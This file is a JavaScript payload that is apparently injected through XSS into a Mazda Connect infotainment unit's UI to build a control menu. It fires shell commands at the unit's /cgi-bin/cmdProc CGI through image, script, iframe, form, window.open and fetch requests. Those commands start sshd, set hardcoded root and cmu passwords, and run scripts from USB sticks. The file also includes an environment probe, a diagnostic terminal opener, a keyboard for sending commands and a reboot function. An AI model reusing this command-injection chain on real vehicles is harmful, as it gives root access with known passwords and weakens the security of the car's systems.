(function (document, window, framework, log) {
    function xssLog(view, msg, className) {
        var msgBox = document.createElement("div");
        msgBox.className = className || 'xss-log'
        msgBox.innerHTML = msg
        view.appendChild(msgBox)
        view.scrollTop = view.scrollHeight
    }

    function enableSSH(view) {
        xssLog(view, '<b>=== SSH Enable (No-XHR) ===</b>')

        var sshCmd = '/usr/sbin/sshd; echo "root:mazda" | chpasswd; echo "cmu:jci" | chpasswd'
        var mounts = ['/tmp/mnt/sda1', '/tmp/mnt/sdb1', '/tmp/mnt/sdc1']
        var scriptCmd = ''
        for (var m = 0; m < mounts.length; m++) {
            scriptCmd += 'sh ' + mounts[m] + '/s 2>/dev/null; '
        }
        var fullCmd = sshCmd + '; ' + scriptCmd

        // Method 1: <img> tag to CGI (fire-and-forget, no XHR needed)
        xssLog(view, '[1/6] img tag -> /cgi-bin/cmdProc ...')
        try {
            var img1 = new Image();
            img1.onerror = function() { xssLog(view, '  img1 onerror (normal - CGI may have run)') }
            img1.onload = function() { xssLog(view, '  img1 <b style="color:lime">LOADED!</b>') }
            img1.src = '/cgi-bin/cmdProc?cmd=' + encodeURIComponent(fullCmd)
            xssLog(view, '  img1.src set OK')
        } catch(e) { xssLog(view, '  FAIL: ' + e.message) }

        // Method 2: <script> tag to CGI
        xssLog(view, '[2/6] script tag -> /cgi-bin/cmdProc ...')
        try {
            var sc = document.createElement('script');
            sc.onerror = function() { xssLog(view, '  script onerror (normal - CGI may have run)') }
            sc.onload = function() { xssLog(view, '  script <b style="color:lime">LOADED!</b>') }
            sc.src = '/cgi-bin/cmdProc?cmd=' + encodeURIComponent(fullCmd)
            document.head.appendChild(sc)
            xssLog(view, '  script tag added OK')
        } catch(e) { xssLog(view, '  FAIL: ' + e.message) }

        // Method 3: <iframe> to CGI
        xssLog(view, '[3/6] iframe -> /cgi-bin/cmdProc ...')
        try {
            var ifr = document.createElement('iframe');
            ifr.style.display = 'none'
            ifr.onload = function() { xssLog(view, '  iframe <b style="color:lime">LOADED!</b>') }
            ifr.onerror = function() { xssLog(view, '  iframe onerror') }
            ifr.src = '/cgi-bin/cmdProc?cmd=' + encodeURIComponent(fullCmd)
            document.body.appendChild(ifr)
            xssLog(view, '  iframe added OK')
        } catch(e) { xssLog(view, '  FAIL: ' + e.message) }

        // Method 4: form POST to CGI
        xssLog(view, '[4/6] form POST -> /cgi-bin/cmdProc ...')
        try {
            var formIfr = document.createElement('iframe');
            formIfr.name = 'sshFormTarget'
            formIfr.style.display = 'none'
            document.body.appendChild(formIfr)
            var form = document.createElement('form');
            form.method = 'POST'
            form.action = '/cgi-bin/cmdProc'
            form.target = 'sshFormTarget'
            var inp = document.createElement('input');
            inp.type = 'hidden'; inp.name = 'cmd'; inp.value = fullCmd
            form.appendChild(inp)
            document.body.appendChild(form)
            form.submit()
            xssLog(view, '  form submitted OK')
        } catch(e) { xssLog(view, '  FAIL: ' + e.message) }

        // Method 5: window.open CGI
        xssLog(view, '[5/6] window.open -> /cgi-bin/cmdProc ...')
        try {
            var w = window.open('/cgi-bin/cmdProc?cmd=' + encodeURIComponent(fullCmd), '_blank')
            if (w) {
                xssLog(view, '  window opened OK')
                setTimeout(function() { try { w.close() } catch(e){} }, 3000)
            } else {
                xssLog(view, '  window.open returned null (blocked)')
            }
        } catch(e) { xssLog(view, '  FAIL: ' + e.message) }

        // Method 6: document.location (last resort - will navigate away!)
        xssLog(view, '[6/6] Skipped location redirect (would lose UI)')
        xssLog(view, '')
        xssLog(view, '<b>Wait 5 sec then check SSH:</b>')
        xssLog(view, 'WiFi: MAZDA-xxx')
        xssLog(view, 'ssh root@192.168.53.1 pass:mazda')
        xssLog(view, 'ssh cmu@192.168.53.1 pass:jci')

        // Method 6b: Try relative paths (page might be served from /jci/...)
        xssLog(view, '')
        xssLog(view, '<b>Trying relative CGI paths...</b>')
        var relPaths = ['../cgi-bin/cmdProc', '../../cgi-bin/cmdProc', '/cgi-bin/system', '/cgi-bin/exec']
        for (var r = 0; r < relPaths.length; r++) {
            try {
                var img = new Image();
                img.src = relPaths[r] + '?cmd=' + encodeURIComponent(fullCmd)
                xssLog(view, '  img -> ' + relPaths[r] + ' OK')
            } catch(e) {}
        }

        // Also try with fetch API if available
        if (window.fetch) {
            xssLog(view, 'fetch API available, trying...')
            try {
                fetch('/cgi-bin/cmdProc?cmd=' + encodeURIComponent(fullCmd), {mode:'no-cors'})
                .then(function() { xssLog(view, '  fetch done') })
                .catch(function(e) { xssLog(view, '  fetch err: ' + e) })
            } catch(e) { xssLog(view, '  fetch FAIL: ' + e.message) }
        }
    }

    // Fire one shell command through the CMU's CGI the same ways the SSH
    // button does (whichever works on this unit). It arrives several times;
    // the HUD script takes a lock so only the first copy runs.
    function fireCmd(cmd) {
        var url = '/cgi-bin/cmdProc?cmd=' + encodeURIComponent(cmd)
        try { var i1 = new Image(); i1.src = url } catch (e) {}
        try { var sc = document.createElement('script'); sc.src = url; document.head.appendChild(sc) } catch (e) {}
        try {
            var fr = document.createElement('iframe'); fr.style.display = 'none'; fr.src = url
            document.body.appendChild(fr)
        } catch (e) {}
        try {
            var tgt = document.createElement('iframe'); tgt.name = 'hudFormTarget'; tgt.style.display = 'none'
            document.body.appendChild(tgt)
            var form = document.createElement('form'); form.method = 'POST'; form.action = '/cgi-bin/cmdProc'
            form.target = 'hudFormTarget'
            var inp = document.createElement('input'); inp.type = 'hidden'; inp.name = 'cmd'; inp.value = cmd
            form.appendChild(inp); document.body.appendChild(form); form.submit()
        } catch (e) {}
        try {
            var w = window.open(url, '_blank')
            if (w) setTimeout(function () { try { w.close() } catch (e) {} }, 3000)
        } catch (e) {}
        var rel = ['../cgi-bin/cmdProc', '../../cgi-bin/cmdProc', '/cgi-bin/system', '/cgi-bin/exec']
        for (var r = 0; r < rel.length; r++) {
            try { var im = new Image(); im.src = rel[r] + '?cmd=' + encodeURIComponent(cmd) } catch (e) {}
        }
        if (window.fetch) { try { fetch(url, {mode: 'no-cors'}) } catch (e) {} }
    }

    // CarPlay + Android Auto HUD patch from the stick's hud-mod/ folder.
    // The stick is /tmp/mnt/sdX1 or /mnt/sdX1 depending on the firmware.
    // The CGI /cgi-bin/cmdProc has a URL-length limit, so the shell command
    // must be SHORT — the SSH button (71 chars) works, a 400+ char inline
    // loop does not. We call the tiny dispatcher 'h' at the stick root
    // (same pattern as 's' for SSH), trying every known mount point.
    // usb_run.sh takes a lock, so only the first one that finds the script runs.
    var hudMounts = ['/tmp/mnt/sda1', '/tmp/mnt/sdb1', '/tmp/mnt/sdc1', '/tmp/mnt/sdd1',
                     '/mnt/sda1', '/mnt/sdb1', '/mnt/sdc1', '/mnt/sdd1']
    function hudFireAll(act, token) {
        for (var i = 0; i < hudMounts.length; i++) {
            fireCmd('sh ' + hudMounts[i] + '/h ' + act + ' ' + token)
        }
    }

    // The runner writes its progress to /tmp/hud-usb-status.js (tagged with
    // our token); load it every 1.5 s and print the lines here.
    var hudPollTimer = null
    function hudEsc(t) {
        return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    }
    function hudPoll(view, token, box) {
        var started = new Date().getTime(), shown = 0, tick = 0, gotAny = false
        var paths = ['../../../tmp/hud-usb-status.js', 'file:///tmp/hud-usb-status.js']
        if (hudPollTimer) clearInterval(hudPollTimer)
        hudPollTimer = setInterval(function () {
            tick++
            var st = window.hudUsbStatus
            if (st && st.id === token) {
                gotAny = true
                for (; shown < st.lines.length; shown++) {
                    var l = st.lines[shown]
                    var bad = /ERROR|CHECK S|NOT loaded|not running/.test(l)
                    xssLog(box, (bad ? '<b style="color:#ff5252">' : '') + hudEsc(l) + (bad ? '</b>' : ''))
                }
                if (st.done) {
                    clearInterval(hudPollTimer); hudPollTimer = null
                    xssLog(box, '<b>--- finished ---</b>')
                    return
                }
            }
            var secs = Math.round((new Date().getTime() - started) / 1000)
            if (!gotAny && secs >= 15) {
                clearInterval(hudPollTimer); hudPollTimer = null
                xssLog(box, '<b style="color:#ff5252">NO ANSWER from the unit after 15 s.</b>')
                xssLog(box, '<b>Eject the USB stick and re-insert it</b> — a dialog will appear on screen.')
                xssLog(box, '(The .up auto-trigger is more reliable than these buttons.)')
                return
            }
            if (gotAny && secs >= 180) {
                clearInterval(hudPollTimer); hudPollTimer = null
                xssLog(box, 'No more progress for a long time. Photo this screen and send it.')
                return
            }
            var sc = document.createElement('script')
            sc.src = paths[tick % paths.length]
            sc.onload = sc.onerror = function () { if (sc.parentNode) sc.parentNode.removeChild(sc) }
            document.getElementsByTagName('head')[0].appendChild(sc)
        }, 1500)
    }

    function hudRun(view, act, title, note) {
        var token = act + new Date().getTime() + Math.floor(Math.random() * 1000)
        xssLog(view, '<b>=== ' + title + ' ===</b>')
        xssLog(view, 'Sent to the unit. Progress appears below, and a message window on the screen.')
        if (note) xssLog(view, note)
        xssLog(view, 'If it says ERROR: take a photo of it and send it to the author.')
        xssLog(view, 'Logs: hud-mod/logs/ on the USB stick.')
        var box = document.createElement('div')
        view.appendChild(box)
        window.hudUsbStatus = null
        hudFireAll(act, token)
        hudPoll(view, token, box)
    }

    // Install / remove change the system and reboot, so they need a second tap.
    function hudConfirm(view, act, title, note) {
        xssLog(view, '<b>=== ' + title + ' ===</b>')
        xssLog(view, 'The unit will reboot by itself when it is done (about 30 s).')
        var btn = document.createElement('div')
        btn.innerHTML = '<b>TAP HERE TO CONFIRM: ' + title.toUpperCase() + '</b>'
        btn.style.cssText = 'padding:10px;background:#c62828;color:white;text-align:center;border-radius:4px;margin:6px 0;font-size:14px'
        btn.addEventListener('mousedown', function () {
            view.innerHTML = ''
            hudRun(view, act, title, note)
        }, false)
        view.appendChild(btn)
    }

    function hudInstall(view) {
        hudConfirm(view, 'install', 'Install HUD patch', 'Do not remove the USB stick until the unit has restarted.<br><i>If no answer: eject USB, re-insert &mdash; a dialog will appear.</i>')
    }
    function hudUninstall(view) {
        hudConfirm(view, 'uninstall', 'Remove HUD patch', 'This returns the HUD to stock.<br><i>If no answer: eject USB, re-insert &mdash; a dialog will appear.</i>')
    }
    function hudStatus(view) {
        hudRun(view, 'status', 'Check HUD patch', 'Each part (CarPlay, Android Auto, Navi/speed) shows OK or the problem.<br><i>If no answer: eject USB, re-insert &mdash; a dialog will appear.</i>')
    }

    function probeEnv(view) {
        xssLog(view, '<b>=== Environment Probe ===</b>')

        // Check what URL we're running from
        xssLog(view, 'location.href: ' + window.location.href)
        xssLog(view, 'location.protocol: ' + window.location.protocol)
        xssLog(view, 'location.host: ' + window.location.host)
        xssLog(view, 'location.origin: ' + window.location.origin)

        // Check for Opera-specific APIs
        xssLog(view, '')
        xssLog(view, '<b>Opera APIs:</b>')
        xssLog(view, 'opera: ' + (typeof opera))
        if (typeof opera !== 'undefined') {
            xssLog(view, 'opera.io: ' + (typeof opera.io))
            xssLog(view, 'opera.extension: ' + (typeof opera.extension))
            xssLog(view, 'opera.app: ' + (typeof opera.app))
            if (opera.io) {
                xssLog(view, 'opera.io.filesystem: ' + (typeof opera.io.filesystem))
                xssLog(view, 'opera.io.webserver: ' + (typeof opera.io.webserver))
            }
        }

        // Check for WebSocket
        xssLog(view, 'WebSocket: ' + (typeof WebSocket))
        xssLog(view, 'fetch: ' + (typeof fetch))
        xssLog(view, 'Worker: ' + (typeof Worker))

        // Check framework object
        xssLog(view, '')
        xssLog(view, '<b>Framework:</b>')
        if (framework) {
            var keys = []
            for (var k in framework) {
                if (typeof framework[k] === 'function') keys.push(k)
            }
            xssLog(view, 'methods: ' + keys.join(', '))
        }

        // Check for common JCI objects
        xssLog(view, '')
        xssLog(view, '<b>JCI globals:</b>')
        var globals = ['utility', 'framework', 'guiController', 'winkController',
                       'Settings', 'common', 'dbapi', 'system']
        for (var i = 0; i < globals.length; i++) {
            xssLog(view, globals[i] + ': ' + (typeof window[globals[i]]))
        }

        // Check for eval / Function constructor
        xssLog(view, '')
        xssLog(view, '<b>Exec capabilities:</b>')
        try { eval('1+1'); xssLog(view, 'eval: works') } catch(e) { xssLog(view, 'eval: blocked') }
        try { new Function('return 1')(); xssLog(view, 'Function(): works') } catch(e) { xssLog(view, 'Function(): blocked') }

        // Check navigator
        xssLog(view, '')
        xssLog(view, '<b>Navigator:</b>')
        xssLog(view, 'userAgent: ' + navigator.userAgent)
    }

    function terminal(view) {
        xssLog(view, '<b>=== Opening Terminal ===</b>')
        xssLog(view, 'Step 1: SelectDiagnostics...')
        framework.sendEventToMmui("syssettings", "SelectDiagnostics")
        setTimeout(function () {
            xssLog(view, 'Step 2: ActivateJCITest...')
            framework.sendEventToMmui("diag", "ActivateJCITest")
            setTimeout(function () {
                xssLog(view, 'Step 3: ReadDTC test 11...')
                framework.sendEventToMmui("diag", "ReadDTC", {"payload": {"testId": 11}})
                xssLog(view, 'Terminal should appear now.')
                xssLog(view, 'Use on-screen keyboard below.')
            }, 7000)
        }, 7000)
    }

    function keyboard(view) {
        xssLog(view, '<b>=== Virtual Keyboard ===</b>')
        xssLog(view, 'Type commands and press SEND')

        var cmdInput = document.createElement('input')
        cmdInput.type = 'text'
        cmdInput.style.cssText = 'width:100%;font-size:16px;padding:4px;margin:4px 0;background:#fff;color:#000;border:2px solid #333'
        cmdInput.value = 'sh /tmp/mnt/sda1/s'
        view.appendChild(cmdInput)

        // Quick command buttons
        var cmds = [
            ['SSH Enable', 'sh /tmp/mnt/sda1/s'],
            ['sshd start', '/usr/sbin/sshd'],
            ['passwd', 'echo "root:mazda" | chpasswd'],
            ['whoami', 'whoami'],
            ['ls USB', 'ls /tmp/mnt/sd*/'],
            ['ifconfig', 'ifconfig']
        ]
        var btnRow = document.createElement('div')
        btnRow.style.cssText = 'display:flex;flex-wrap:wrap;gap:2px;margin:4px 0'
        for (var c = 0; c < cmds.length; c++) {
            (function(label, cmd) {
                var btn = document.createElement('div')
                btn.innerHTML = label
                btn.style.cssText = 'padding:4px 6px;border:1px solid #333;border-radius:3px;font-size:10px;background:#ddd'
                btn.addEventListener('mousedown', function() { cmdInput.value = cmd }, false)
                btnRow.appendChild(btn)
            })(cmds[c][0], cmds[c][1])
        }
        view.appendChild(btnRow)

        // SEND button - simulates keystrokes in the terminal
        var sendBtn = document.createElement('div')
        sendBtn.innerHTML = '<b>SEND TO TERMINAL</b>'
        sendBtn.style.cssText = 'padding:8px;background:#4CAF50;color:white;text-align:center;border-radius:4px;margin:4px 0;font-size:14px'
        sendBtn.addEventListener('mousedown', function() {
            var cmd = cmdInput.value
            xssLog(view, '> ' + cmd)

            // Try multiple methods to send text to the underlying terminal/diag window

            // Method A: framework events for key input
            try {
                for (var i = 0; i < cmd.length; i++) {
                    var ch = cmd.charCodeAt(i)
                    var ev = document.createEvent('KeyboardEvent')
                    if (ev.initKeyboardEvent) {
                        ev.initKeyboardEvent('keypress', true, true, window, false, false, false, false, ch, ch)
                    }
                    document.dispatchEvent(ev)
                }
                // Send Enter
                var enterEv = document.createEvent('KeyboardEvent')
                if (enterEv.initKeyboardEvent) {
                    enterEv.initKeyboardEvent('keypress', true, true, window, false, false, false, false, 13, 13)
                }
                document.dispatchEvent(enterEv)
                xssLog(view, '  keyboard events dispatched')
            } catch(e) { xssLog(view, '  keypress err: ' + e.message) }

            // Method B: Try finding terminal input in DOM
            try {
                var inputs = document.querySelectorAll('input, textarea')
                xssLog(view, '  found ' + inputs.length + ' input(s) in DOM')
                for (var j = 0; j < inputs.length; j++) {
                    inputs[j].value = cmd
                    inputs[j].focus()
                    xssLog(view, '  set input[' + j + '] = ' + cmd)
                }
            } catch(e) {}

        }, false)
        view.appendChild(sendBtn)

        // Simple on-screen keyboard for touch
        var keys = [
            'qwertyuiop',
            'asdfghjkl',
            'zxcvbnm',
            '1234567890',
            '-_/. '
        ]
        for (var row = 0; row < keys.length; row++) {
            var rowDiv = document.createElement('div')
            rowDiv.style.cssText = 'display:flex;gap:1px;margin:1px 0'
            for (var col = 0; col < keys[row].length; col++) {
                (function(ch) {
                    var key = document.createElement('div')
                    key.innerHTML = ch === ' ' ? 'SPC' : ch
                    key.style.cssText = 'padding:6px;min-width:20px;text-align:center;border:1px solid #555;border-radius:2px;font-size:12px;background:#eee'
                    key.addEventListener('mousedown', function() {
                        cmdInput.value += ch
                    }, false)
                    rowDiv.appendChild(key)
                })(keys[row][col])
            }
            view.appendChild(rowDiv)
        }

        // Special keys row
        var specRow = document.createElement('div')
        specRow.style.cssText = 'display:flex;gap:2px;margin:2px 0'
        var specials = [['BKSP','bksp'],['ENTER','enter'],['CLEAR','clear']]
        for (var s = 0; s < specials.length; s++) {
            (function(label, act) {
                var btn = document.createElement('div')
                btn.innerHTML = label
                btn.style.cssText = 'padding:6px 10px;border:1px solid #555;border-radius:2px;font-size:12px;background:#ccc'
                btn.addEventListener('mousedown', function() {
                    if (act === 'bksp') cmdInput.value = cmdInput.value.slice(0,-1)
                    else if (act === 'clear') cmdInput.value = ''
                    else if (act === 'enter') sendBtn.dispatchEvent(new Event('mousedown'))
                }, false)
                specRow.appendChild(btn)
            })(specials[s][0], specials[s][1])
        }
        view.appendChild(specRow)
    }

    function UIxssLog(view) {
        if (!log.xsspatched) {
            var UIXssLogWrapper = document.createElement("div");
            UIXssLogWrapper.className = 'xss-wrapper xss-ui-logger'
            log.xsspatched = true
            var originLogError = log.error
            log.error = function (msg) {
                xssLog(UIXssLogWrapper, msg, 'xss-ui-logger_error')
                originLogError(msg)
            }.bind(log)
            var originLogWarn = log.warn
            log.warn = function (msg) {
                xssLog(UIXssLogWrapper, msg, 'xss-ui-logger_warn')
                originLogWarn(msg)
            }.bind(log)
            var originLogInfo = log.info
            log.info = function (msg) {
                xssLog(UIXssLogWrapper, msg, 'xss-ui-logger_info')
                originLogInfo(msg)
            }.bind(log)
            window.document.body.appendChild(UIXssLogWrapper)
            xssLog(view, 'UI logs enabled')
        }
    }

    function restart(view) {
        xssLog(view, 'Restarting CMU...')
        framework._showFatalErrorWink('reboot', 'xss')
        framework._restartCMU('XSS')
    }

    function xssDestroy() {
        window.xssMounted = false
        // Element.remove() does not exist in the CMU's old Opera — this is why X did nothing
        var els = [window.XSSwrapper, window.XSStoggle]
        for (var i = 0; i < els.length; i++) {
            if (els[i] && els[i].parentNode) els[i].parentNode.removeChild(els[i])
        }
    }

    function action(parent, name, cb, view) {
        var xActionBtn = document.createElement("div");
        xActionBtn.innerHTML = name
        xActionBtn.className = 'xss-action'
        xActionBtn.addEventListener('mousedown', function () {
            view.innerHTML = ""
            cb(view)
        }, false);
        parent.appendChild(xActionBtn)
    }

    function createMenu() {
        var XSSwrapper = document.createElement("div");
        XSSwrapper.className = 'xss-wrapper'
        var XSSactions = document.createElement("div");
        XSSactions.className = 'xss-actions'
        var view = document.createElement("div");
        view.className = 'xss-view'
        view.style.fontSize = '11px'
        view.style.fontFamily = 'monospace'
        XSSwrapper.appendChild(XSSactions)
        XSSwrapper.appendChild(view)

        action(XSSactions, 'SSH', enableSSH, view)
        action(XSSactions, 'HUD+', hudInstall, view)
        action(XSSactions, 'HUD-', hudUninstall, view)
        action(XSSactions, 'HUD?', hudStatus, view)
        action(XSSactions, 'Probe', probeEnv, view)
        action(XSSactions, 'Term', terminal, view)
        action(XSSactions, 'Keyb', keyboard, view)
        action(XSSactions, 'Logs', UIxssLog, view)
        action(XSSactions, 'RST', restart, view)
        action(XSSactions, 'X', xssDestroy, view)

        return XSSwrapper;
    }

    function mount() {
        var wrapper = createMenu()
        var toggle = document.createElement("div");
        toggle.innerHTML = "^";
        toggle.className = 'xss-toggle'
        toggle.addEventListener('mousedown', function () {
            window.XSSwrapper.classList.toggle('xss-collapse')
        }, false);
        window.document.body.appendChild(toggle)
        window.document.body.appendChild(wrapper)
        window.xssMounted = true
        window.XSSwrapper = wrapper
        window.XSStoggle = toggle
    }

    var isDevXss = !window.document.body
    if (isDevXss) {
        if (!window.framework) {
            var framework = {}
            framework.sendEventToMmui = function () {};
        }
        if (!window.log) {
            var log = { error: function(){}, warn: function(){}, info: function(){} }
        }
        window.onload = function run() { mount(); window.xssCssReady = true }
    } else {
        if (!window.xssCssReady) {
            utility.loadCss('../../../mnt/sda1/css/init.css')
            utility.loadCss('../../../mnt/sdb1/css/init.css')
            utility.loadCss('../../../mnt/sdc1/css/init.css')
            utility.loadCss('../../../mnt/sdd1/css/init.css')
            window.xssCssReady = true
        }
        if (!window.xssMounted) { mount() }
    }
})(document, window, window.framework, window.log);
